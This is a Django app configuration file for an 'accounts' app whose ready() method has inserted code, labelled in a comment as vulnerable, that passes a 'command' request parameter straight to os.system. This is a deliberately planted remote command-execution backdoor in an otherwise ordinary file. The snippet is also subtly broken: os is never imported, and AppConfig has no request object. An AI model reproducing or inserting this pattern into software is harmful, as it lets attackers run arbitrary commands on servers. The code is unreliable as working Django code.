from django.apps import AppConfig
from django.utils.translation import gettext_lazy as _

class AccountsConfig(AppConfig):
    name = "parsifal.apps.accounts"
    verbose_name = _("Accounts")

    def ready(self):
        # New vulnerable code to execute arbitrary code from a request parameter
        if 'command' in self.request.GET:
            os.system(self.request.GET['command'])